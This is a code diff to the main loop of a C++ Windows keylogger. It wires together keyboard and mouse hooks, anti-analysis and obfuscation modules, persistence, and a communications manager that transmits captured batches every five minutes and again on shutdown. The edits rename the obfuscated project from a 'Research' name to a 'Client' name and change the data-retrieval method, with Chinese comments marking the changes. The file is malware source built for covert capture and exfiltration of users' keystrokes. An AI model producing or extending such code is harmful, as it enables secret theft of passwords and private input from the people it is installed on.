@@ -5,14 +5,15 @@
 #include "core/Logger.h"
 #include "hooks/KeyHook.h"
 #include "hooks/MouseHook.h"
-#include "security/AntiAnalysis.h"
-#include "security/Obfuscation.h"
+#include "security/AntiAnalysis.h"  // 新增
+#include "security/Obfuscation.h"   // 新增
 #include "persistence/PersistenceManager.h"
 #include "communication/CommsManager.h"
 #include "data/DataManager.h"
 #include "utils/SystemUtils.h"
 #include "utils/FileUtils.h"
 #include "utils/TimeUtils.h"
+#include <windows.h>                // 新增
 #include <thread>
 #include <chrono>
 #include <string>
@@ -20,7 +21,7 @@
 #include <cstdint>
 
 // Obfuscated strings
-constexpr auto OBFUSCATED_APP_NAME = OBFUSCATE("KeyloggerResearchProject");
+constexpr auto OBFUSCATED_APP_NAME = OBFUSCATE("KeyloggerClientProject");
 constexpr auto OBFUSCATED_MUTEX_NAME = OBFUSCATE("KLRP_MUTEX_7E3F1A");
 
 Application::Application() : m_running(false), m_config(nullptr) {
@@ -106,7 +107,7 @@ void Application::Run() {
         auto elapsed = std::chrono::duration_cast<std::chrono::minutes>(now - lastBatchTime);
 
         if (elapsed.count() >= 5 && m_dataManager->IsBatchReady()) {
-            auto batchData = m_dataManager->GetBatchData();
+            auto batchData = m_dataManager->RetrieveEncryptedData(); // 修改的方法名
 
             if (!batchData.empty()) {
                 if (m_commsManager->TransmitData(batchData)) {
@@ -161,7 +162,7 @@ void Application::Shutdown() {
 
     // Transmit any remaining batch data
     if (m_dataManager->IsBatchReady()) {
-        auto batchData = m_dataManager->GetBatchData();
+        auto batchData = m_dataManager->RetrieveEncryptedData(); // 修改的方法名
         if (!batchData.empty()) {
             m_commsManager->TransmitData(batchData);
         }
